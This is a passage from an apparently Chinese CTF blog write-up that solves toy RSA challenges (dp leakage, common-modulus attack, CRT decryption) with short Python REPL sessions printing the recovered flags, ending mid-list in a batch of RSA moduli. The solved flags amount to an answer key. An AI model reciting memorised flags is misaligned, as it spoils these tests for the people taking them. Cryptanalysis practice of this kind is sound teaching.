class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">P2 = <span class="hljs-number">1235542029039790988583258906103</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">P3 = <span class="hljs-number">1235542029039790988583258906163</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p4 = <span class="hljs-number">1235542029039790988583258906019</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (P1-<span class="hljs-number">1</span>)*(P4-<span class="hljs-number">1</span>)*(P3-<span class="hljs-number">1</span>)*(P2-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (P1-<span class="hljs-number">1</span>)*(p4-<span class="hljs-number">1</span>)*(P3-<span class="hljs-number">1</span>)*(P2-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d</span><br>mpz(510086803712167852900754319229584716089112564397702829464421119022899788570515360220333901730802856685065338443789034993L)<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;2a0efd7734a07c6c430cfd04dfccdd94&#125;<br><span class="hljs-meta">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="easyesa"><a href="#easyesa" class="headerlink" title="easyesa"></a>easyesa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, inverse<br>flag = <span class="hljs-string">&#x27;flag&#123;a-z0-9&#125;&#x27;</span><br>nbits = <span class="hljs-number">2048</span><br>p = getPrime(nbits / <span class="hljs-number">2</span>)<br>q = getPrime(nbits / <span class="hljs-number">2</span>)<br><span class="hljs-keyword">assert</span> p != q<br>N = p * q<br>e = <span class="hljs-number">0x10001</span><br>phiN = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phiN)<br>phint = d % (p - <span class="hljs-number">1</span>)<br>qhint = q % (p - <span class="hljs-number">1</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2int</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(s.encode(<span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pubkey.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">str</span>(e) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(N) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(phint) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(qhint) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>plain = str2int(flag)<br><br>c = <span class="hljs-built_in">pow</span>(plain, e, N)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cipher.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">hex</span>(c))<br><br></code></pre></td></tr></table></figure><p>已知<br>e = 65537<br>n = 16969752165509132627630266968748854330340701692125427619559836488350298234735571480353078614975580378467355952333755313935516513773552163392952656321490268452556604858966899956242107008410558657924344295651939297328007932245741660910510032969527598266270511004857674534802203387399678231880894252328431133224653544948661283777645985028207609526654816645155558915197745062569124587412378716049814040670665079480055644873470756602993387261939566958806296599782943460141582045150971031211218617091283284118573714029266331227327398724265170352646794068702789645980810005549376399535110820052472419846801809110186557162127<br>dp = 1781625775291028870269685257521108090329543012728705467782546913951537642623621769246441122189948671374990946405164459867410646825591310622618379116284293794090970292165263334749393009999335413089903796624326168039618287078192646490488534062803960418790874890435529393047389228718835244370645215187358081805<br>qp = 10450978538445496868237560522155647855468044038637044818500580506745232482415364474390893285539835615564332910332708101539048528242011762736342572650763270501265440674647489375438852377280494520168349154604800218665628586180057648386859933274414030182106920793492451577530884172876623074281199949317487086975<br>c = 0x71512577b69cea3b42466100f3d5d50de95ab16971ad25d9204ff8df52bd52dafcd054d997ec3fe37d2590c2b0eebec172ec02fa62c35c62e39c89f1f5c51c869a5cc8083c1e76da430f26542a444a0295f52414118e47b72e9f370498cca3a69a1148c9433b97bc816dee45d12fec94f6aaf754273cfb19b0055d5b00630ba1b8a6b2b0a2abfd630d68b7a95e2ec45192e2ff229f893ea6ec7620677d4d8bd79f3dd420e0b2c0a26de37c700a3953c2094c4797bbbb47f72fdc1d8acac69b755d0caeb090885baf7b8e2ea4b36a41bea67477101b9706dedc338e076921c98c8ce2468ab48b14829241dbdfb8572a84714c798a29742b4176061efdf0320c86</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65538</span>):</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">if</span>  (dp*e-<span class="hljs-number">1</span>)%i == <span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">        <span class="hljs-keyword">if</span> n%(((dp*e-<span class="hljs-number">1</span>)//i)+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">            q = n//(((dp*e-<span class="hljs-number">1</span>)//i)+<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">...</span> <span class="python">            p = (((dp*e-<span class="hljs-number">1</span>)//i)+<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">...</span> <span class="python">            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">...</span> <span class="python">            d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">...</span> <span class="python">            m=<span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">...</span> <span class="python">            <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span><br>flag&#123;cef4c0553ae4a3cd4da5aea6899669e3cbdec184&#125;<br></code></pre></td></tr></table></figure><p>其实很容易推出公式</p><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><p>共模攻击板子<br>c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361<br>n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801<br>e1=11187289<br>c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397<br>e2=9647291</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">    s = -s</span><br><span class="hljs-meta">...</span> <span class="python">    c1 = gmpy2.invert(c1, n)</span><br><span class="hljs-meta">...</span> <span class="python"><span class="hljs-keyword">elif</span> t &lt; <span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">    t = -t</span><br><span class="hljs-meta">...</span> <span class="python">    c2 = gmpy2.invert(c2, n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">plain = <span class="hljs-built_in">pow</span>(c1, s, n) * <span class="hljs-built_in">pow</span>(c2, t, n) % n</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(plain)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;<br></code></pre></td></tr></table></figure><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p>e = 65537<br>n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113<br>dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</p><p>c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751<br>和上面某题一模一样的写法啊</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65538</span>):</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">if</span> (e*dp-<span class="hljs-number">1</span>)%i==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">        <span class="hljs-keyword">if</span> n%((e*dp-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">            p = (e*dp-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span></span><br><span class="hljs-meta">...</span> <span class="python">            q = n//p</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;<br></code></pre></td></tr></table></figure><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p>p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852<br>中国剩余定理<br>推出公式来解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">dp,dq,p,q,c</span>):</span><br>InvQ = gmpy2.invert(q, p)<br>mp = <span class="hljs-built_in">pow</span>(c, dp, p)<br>mq = <span class="hljs-built_in">pow</span>(c, dq, q)<br>m = (((mp-mq)*InvQ) % p)*q+mq<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br></code></pre></td></tr></table></figure><p>直接用现成轮子</p><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-attr">m</span> = xxxxxxxx<br><span class="hljs-attr">e</span> = <span class="hljs-number">65537</span><br>========== n <span class="hljs-attr">c</span> ==========<br><span class="hljs-attr">n</span> = <span class="hljs-number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class="hljs-attr">c</span> = <span 